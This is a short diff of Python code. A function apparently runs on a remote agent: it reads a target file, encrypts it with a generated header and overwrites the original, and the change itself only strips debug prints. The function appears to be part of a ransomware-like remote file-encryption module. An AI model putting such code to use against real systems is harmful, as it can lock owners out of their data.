@@ -33,19 +33,16 @@ def encrypt_bytearray(data: bytearray, header) -> bytes:
 def function(agent_id, args):
     header = generate_encrypted_header()
     file = args[0]
-    print(f"Encrypt {args}")
     ret = isencrypted(agent_id, [file])
     if ret["retval"] != 0:
         return {"retval":-1, "message":"Error checking whether file is encrypted."}
     if ret["encrypted"] == "1":
         return {"retval":"File already encrypted"}
     data = read(agent_id, [file])
-    print(f"read = {data}")
     if(data["retval"] != 0):
         return {"retval":"Error opening file"}
     encrypted = encrypt_bytearray(data["data"], header)
     write_ret = write(agent_id, [file, encrypted])
-    print(f"write = {write_ret}")
     import hashlib
     if write_ret["retval"] != 0:
         return {"retval":"Error writing"}
